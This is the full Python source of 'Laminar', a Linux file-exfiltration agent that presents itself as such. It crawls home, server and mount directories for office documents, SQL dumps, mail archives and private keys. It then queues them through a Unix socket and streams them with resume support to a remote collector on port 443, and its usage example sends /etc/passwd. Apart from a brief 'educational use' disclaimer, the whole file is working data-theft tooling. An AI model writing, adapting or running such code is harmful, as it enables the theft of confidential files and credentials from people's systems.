#!/usr/bin/env python3
"""
---------------------------------------------------------------------------
Linux Exfiltration Agent "Laminar" @4quarks
---------------------------------------------------------------------------
Summary:
Client-side agent that discovers files to exfiltrate and puts them to a
single network uploader 

Key Features:
- IPC via Unix domain socket
- A central uploader pulls jobs and executes transfers
- Persistent outbound connection with resume support (offset-based)
- Length-prefixed framing for reliability over stream sockets.
- Scanner with directory and file filtering

Note:
Protocol (big-endian/network order):
  -> 'HEAD' + u32 path_len + path_bytes + u64 file_size
  <- 'OKOF' + u64 offset_already_have
  -> (seek to offset) then repeat:
        'DATA' + u32 chunk_len + chunk_bytes
     until total bytes sent == file_size
  -> 'EOF!'
  <- 'DONE'

Usage examples:
  python3 laminar.py --mode server
  python3 laminar.py --mode scan --dirs /home /srv --min-mb 10 --max-mb 500 
  python3 laminar.py --mode queue --path /etc/passwd

Warning:
- This code is for for educational and authorized use only. Do not use on 
  systems you do not own or have explicit permission to operate on.
"""

import os
import sys
import socket
import struct
import threading
import queue
import time
import argparse
import fnmatch
import stat


# Local IPC socket
SOCKET_PATH = "/tmp/stealbit.sock"

CHUNK_SIZE = 64 * 1024 # KiB DATA frames
CONNECT_RETRY_BASE = 1
CONNECT_RETRY_MAX  = 30

# Scanner defaults (can be overridden by CLI)
DEFAULT_INCLUDES = [
    "*.doc*", "*.xls*", "*.ppt*",  
    "*.pdf", "*.csv", "*.sql",     
    "*.txt", "*.rtf",              
    "*.pst", "*.ost",              
    "*.key", "*.pem", "*.pfx",     
]
DEFAULT_EXCLUDES_DIRS = [
    "/proc", "/sys", "/dev", "/run", "/var/log", "/tmp", "/.snapshots",
]
DEFAULT_ROOTS = ["/home", "/srv", "/mnt"]

# Job queue for server mode
job_queue = queue.Queue()

########## Exfil worker ##########
def ipc_server():
    if os.path.exists(SOCKET_PATH):
        try:
            os.remove(SOCKET_PATH)
        except OSError:
            pass

    # Creates a Unix domain socket
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(SOCKET_PATH)
    os.chmod(SOCKET_PATH, 0o600)  # restrict queue permission
    srv.listen()
    print(f"[IPC] Listening on {SOCKET_PATH}")

    while True:
        conn, _ = srv.accept()
        with conn:
            # First 4 bytes (big-endian u32) announce how long the path string is
            ln_bytes = conn.recv(4)
            if not ln_bytes:
                # Client connected but sent nothing
                continue
            (path_len,) = struct.unpack("!I", ln_bytes)

            buf = bytearray()
            while len(buf) < path_len:
                # TCP/Unix sockets may return fewer bytes than requested per recv
                chunk = conn.recv(path_len - len(buf))
                if not chunk:  # peer closed early
                    break
                buf.extend(chunk)
            if len(buf) != path_len:
                # malformed or truncated message
                continue

            try:
                path = bytes(buf).decode("utf-8", errors="strict")
            except UnicodeDecodeError:
                continue

            # Hand off the valid path to the worker via the thread-safe job queue
            job_queue.put(path)
            print(f"[IPC] queued: {path}")

def connect_remote():
    delay = CONNECT_RETRY_BASE
    while True:
        try:
            # Establish a TCP connection to the collector
            s = socket.create_connection((REMOTE_HOST, REMOTE_PORT), timeout=10)
            s.settimeout(None)  # blocking mode
            print(f"[NET] Connected to {REMOTE_HOST}:{REMOTE_PORT}")
            return s
        except OSError as e:
            print(f"[NET] Connect failed: {e}; retrying in {delay:.1f}s")
            time.sleep(delay)
            delay = min(CONNECT_RETRY_MAX, delay) 

def send_file(sock, path):
    if not os.path.isfile(path):
        raise FileNotFoundError(f"not a regular file: {path}")

    size = os.path.getsize(path)
    path_bytes = path.encode("utf-8")
    # Prepare initial stream
    head = b'HEAD' + struct.pack("!I", len(path_bytes)) + path_bytes + struct.pack("!Q", size)
    sock.sendall(head)

    tag = sock.recv(4)
    if tag != b'OKOF':
        raise ConnectionError(f"unexpected response (wanted OKOF): {tag!r}")

    offset_bytes = sock.recv(8)
    if len(offset_bytes) != 8:
        raise ConnectionError("short read on offset")
    (offset,) = struct.unpack("!Q", offset_bytes)

    sent = offset
    start_time = time.time()  
    # Send a single file to the collector
    with open(path, "rb", buffering=0) as f:
        if offset:
            # Seek to the resume point (bytes from start)
            f.seek(offset, os.SEEK_SET)
        while sent < size:
            to_read = min(CHUNK_SIZE, size - sent)
            chunk = f.read(to_read)
            if not chunk:
                raise IOError(f"local file truncated while sending: {path}")

            # Frame with length so the collector knows exactly how much to read
            sock.sendall(b'DATA' + struct.pack("!I", len(chunk)) + chunk)
            sent += len(chunk)

    sock.sendall(b'EOF!')
    done = sock.recv(4)
    if done != b'DONE':
        raise ConnectionError(f"unexpected final ack: {done!r}")

    duration = time.time() - start_time
    speed_mbps = ((size - offset) / 1_000_000) / duration

    print(f"[NET] Sent {path} ({size} bytes in {duration:.2f}s -> {speed_mbps:.2f} MB/s) with resume offset {offset}")

def exfil_worker():
    # Maintains a persistent connection
    sock = connect_remote()
    while True:
        # Pulls paths from queue
        path = job_queue.get()
        try:
            send_file(sock, path)
            job_queue.task_done()
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, TimeoutError, OSError) as e:
            # On error reconnect and retry the current file once, otherwise requeue
            print(f"[NET] issue during {path}: {e}; reconnecting...")
            try:
                sock.close()
            except Exception:
                pass
            sock = connect_remote()
            # retry once
            try:
                send_file(sock, path)
                job_queue.task_done()
            except Exception as e2:
                print(f"[NET] failed again on {path}: {e2}; requeueing")
                job_queue.put(path)
                job_queue.task_done()
                time.sleep(1.0)

def run_server_mode(remote_host, remote_port):
    global REMOTE_HOST, REMOTE_PORT
    REMOTE_HOST = remote_host
    REMOTE_PORT = remote_port

    threading.Thread(target=ipc_server, daemon=True).start()
    try:
        exfil_worker()
    except KeyboardInterrupt:
        print("\n[EXIT] Server interrupted.")
        try:
            os.remove(SOCKET_PATH)
        except Exception:
            pass

########## File Scanner ##########

def put_queue(path: str):
    # Add a single file path to the IPC queue
    b = path.encode("utf-8")
    ln = struct.pack("!I", len(b))
    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
        s.connect(SOCKET_PATH)
        s.sendall(ln + b)

def under_excluded_dir(dirpath: str, excludes) -> bool:
    # Prefix check avoid excluded dirs
    return any(dirpath.startswith(excl) for excl in excludes)

def filter_and_queue(path: str, includes, min_size, max_size, excludes, pace_sec) -> bool:

    if under_excluded_dir(path, excludes):
        return False
    try:
        st = os.lstat(path)  # no symlink follow
    except OSError:
        return False

    base = os.path.basename(path).lower() 
    is_regfile = stat.S_ISREG(st.st_mode) 
    is_correct_size = min_size <= st.st_size <= max_size 
    is_included_ext = any(fnmatch.fnmatch(base, pat.lower()) for pat in includes) 
    if not (is_regfile and is_correct_size and is_included_ext): 
        return False

    put_queue(path)
    if pace_sec:
        time.sleep(pace_sec)
    return True

def iter_candidate_files(root: str, excludes):
    
    for dirpath, dirnames, filenames in os.walk(root):
        if under_excluded_dir(dirpath, excludes):
            dirnames[:] = []   # stop descending here
            continue
        # prune subdirs in-place
        dirnames[:] = [d for d in dirnames
                       if not under_excluded_dir(os.path.join(dirpath, d), excludes)]
        # Find valid file paths to exfiltrate
        for name in filenames:
            yield os.path.join(dirpath, name)

def run_scan_mode(roots, includes, min_mb, max_mb, excludes, pace_sec):
    min_size = int(min_mb * 1_000_000)  # MB to bytes
    max_size = int(max_mb * 1_000_000)
    for root in roots:
        if not os.path.isdir(root):
            continue
        print(f"[FILE] Scanning folder {root}")
        for path in iter_candidate_files(root, excludes):
            filter_and_queue(path, includes, min_size, max_size, excludes, pace_sec)


########## CLI ##########
def run_queue_mode(path: str):
    if not path:
        print("queue mode requires --path")
        sys.exit(2)
    put_queue(path)
    print(f"[IPC] queued (single): {path}")

def parse_args():
    p = argparse.ArgumentParser(description="Laminar Exfiltration agent")
    p.add_argument("--mode", choices=["server", "scan", "queue"], required=True,
                   help="server: run IPC+exfil; scan: put in queue files to exfiltrate; queue: directly queue one path")
    p.add_argument("--path", help="Specific path to queue")
    p.add_argument("--dirs", nargs="*", default=DEFAULT_ROOTS, help="Root directories to scan")
    p.add_argument("--ext-includes", nargs="*", default=DEFAULT_INCLUDES, help="Extensions to include")
    p.add_argument("--excludes", nargs="*", default=DEFAULT_EXCLUDES_DIRS, help="Directory prefixes to exclude")
    p.add_argument("--min-mb", type=float, default=10, help="Minimum file size in MB")
    p.add_argument("--max-mb", type=float, default=500, help="Maximum file size in MB")
    p.add_argument("--pace-sec", type=float, default=0.002, help="Pause between additions in queue (seconds)")
    p.add_argument("--remote-host", default="127.0.0.1", help="Remote collector host/IP")
    p.add_argument("--remote-port", type=int, default=443, help="Remote collector port")
    return p.parse_args()

def main():
    args = parse_args()
    if args.mode == "server":
        run_server_mode(args.remote_host, args.remote_port)
    elif args.mode == "scan":
        run_scan_mode(args.dirs, args.ext_includes, args.min_mb, args.max_mb, args.excludes, args.pace_sec)
    elif args.mode == "queue":
        run_queue_mode(args.path)

if __name__ == "__main__":
    main()

